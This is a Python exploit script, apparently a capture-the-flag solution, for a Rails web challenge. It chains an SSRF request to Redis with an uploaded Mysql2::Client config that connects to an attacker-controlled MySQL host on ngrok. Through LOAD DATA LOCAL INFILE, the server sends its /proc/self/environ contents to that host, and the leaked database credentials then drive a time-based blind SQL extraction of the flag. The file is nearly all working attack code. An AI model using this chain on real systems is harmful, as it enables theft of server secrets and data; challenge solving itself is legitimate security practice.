import requests, string, json, io, socket, sys, time
import mysql.connector as mysqlconn

ENDPOINT = "https://off-dah-rails-m8-b72e2f5ecc4a44d8.chal.monkectf.xyz/"
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 1337
CHARS = "0123456789abcdef}"
CHARS_LEN = len(CHARS)

BASIC_AUTH = "Basic L2hhY2tlci11c2VyOkhUVFAvMS4x" # auth from the blind SSRF to redis

# this can be done manually on the challenge instance
SET_AUTH_REDIS = """SET / HTTP/1.1\r
Host: 127.0.0.1:1337\r
Authorization: Basic bXI6ZmF0bW9ua2VAMTI3LjAuMC4xOjYzNzkvaGFja2VyLXVzZXIjCg==\r
Content-Length: 0\r
\r
\r
"""

ATTACKER_DB_HOST = "0.tcp.eu.ngrok.io"
ATTACKER_DB_PORT = 12397
ATTACKER_DB_USERNAME = "hackeruser"
ATTACKER_DB_PASSWORD = "sUperDupert0PS3cRetP4S5w))D"
ATTACKER_DB_DATABASE = "hackerdb"

ATTACKER_DB_CONN = mysqlconn.connect(
        user=ATTACKER_DB_USERNAME,
        password=ATTACKER_DB_PASSWORD,
        host=ATTACKER_DB_HOST,
        port=ATTACKER_DB_PORT,
        database=ATTACKER_DB_DATABASE
)

LEAK_ENV_JSON = {
    "type": "Mysql2::Client",
    "arg": {
        "host": ATTACKER_DB_HOST,
        "username": ATTACKER_DB_USERNAME,
        "password": ATTACKER_DB_PASSWORD,
        "database": ATTACKER_DB_DATABASE,
        "port": ATTACKER_DB_PORT,
        "local_infile": True,
        "init_command": "LOAD DATA LOCAL INFILE '/proc/self/environ' INTO TABLE leak_env;"
    }
}

SLEEP_TIME = 3

INIT_FD = 11

FLAG_PREFIX = "DUCTF{"

session = requests.Session()

def upload_file(file_contents: str):
    files = {'file': io.BytesIO(file_contents.encode())}
    session.post(ENDPOINT + "upload", files=files)

def trigger_env_leak(curr_fd) -> tuple[str, str]:
    upload_file(json.dumps(LEAK_ENV_JSON))
    try:
        r = session.post(ENDPOINT, json={"config": f"/proc/self/fd/{curr_fd}"}, headers={"Authorization": BASIC_AUTH}, timeout=5)
    except session.exceptions.Timeout:
        return trigger_env_leak(curr_fd + 1)
    
    if r.status_code != 200:
        return trigger_env_leak(curr_fd + 1)
    
    time.sleep(3)
    cur = ATTACKER_DB_CONN.cursor()
    cur.execute("SELECT env FROM leak_env")
    res = cur.fetchall()
    
    if len(res) == 0:
        return trigger_env_leak(curr_fd+1)

    r = res[0][0]
    db_user, db_pass = '', ''
    r_split = r.decode().split("\x00")
    for e in r_split:
        if db_user != '' and db_pass != '': break
        if e.startswith("DB_USER="):
            db_user = e.replace("DB_USER=", "")
        if e.startswith("DB_PASSWORD="):
            db_pass = e.replace("DB_PASSWORD=", "")

    ATTACKER_DB_CONN.close()
    return db_user, db_pass

def ssrf_redis():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.send(SET_AUTH_REDIS.encode())
    s.recv(1)

def upload_poc_for_char(db_user, db_pass, known, test_char):
    tc = test_char
    if tc in ["_", "%", "'", "\\"]:
        tc = f"\{test_char}"

    test_str = known + tc

    upload = json.dumps({
        "type": "Mysql2::Client",
        "arg": {
            "host": "127.0.0.1",
            "username": db_user,
            "password": db_pass,
            "database": "off_dah_rails_m8_production",
            "connect_timeout": SLEEP_TIME,
            "init_command": f"SELECT sleep({SLEEP_TIME + 1}) FROM flag WHERE flag LIKE BINARY '{test_str}%';"
        }
    })

    upload_file(upload)

def try_char(db_user, db_pass, known, test_char, curr_fd) -> tuple[bool, int]:
    upload_poc_for_char(db_user, db_pass, known, test_char)
    t0 = time.time()
    try:
        r = session.post(ENDPOINT, json={"config": f"/proc/self/fd/{curr_fd}"}, headers={"Authorization": BASIC_AUTH}, timeout=8)
    except session.exceptions.Timeout:
        curr_fd += 1
        return try_char(db_user, db_pass, known, test_char, curr_fd)
    t1 = time.time()
    curr_fd += 1
    
    if r.status_code != 400:
        return False
    
    return True if (t1 - t0) >= SLEEP_TIME else try_char(db_user, db_pass, known, test_char, curr_fd)

def clear_rack_fd():
    for _i in range(40):
        session.post(ENDPOINT, json={"config": ""}, headers={"Authorization": BASIC_AUTH}, timeout=8)

def get_flag(db_user, db_pass):
    known = FLAG_PREFIX

    print(f"flag: {known}", end="")
    sys.stdout.flush()

    found = True
    while found:
        found = False
        for c in CHARS:
            print(f"\rflag: {known}{c}", end="")
            sys.stdout.flush()
            clear_rack_fd()
            r = try_char(db_user, db_pass, known, c, INIT_FD)
            if r:
                found = True
                known = known + c
                break
    print(f"\rflag: {known} ")



def main():
    #ssrf_redis()
    db_user, db_pass = trigger_env_leak(INIT_FD)
    print("database username:", db_user)
    print("database password:", db_pass)
    get_flag(db_user, db_pass)


if __name__ == "__main__":
    main()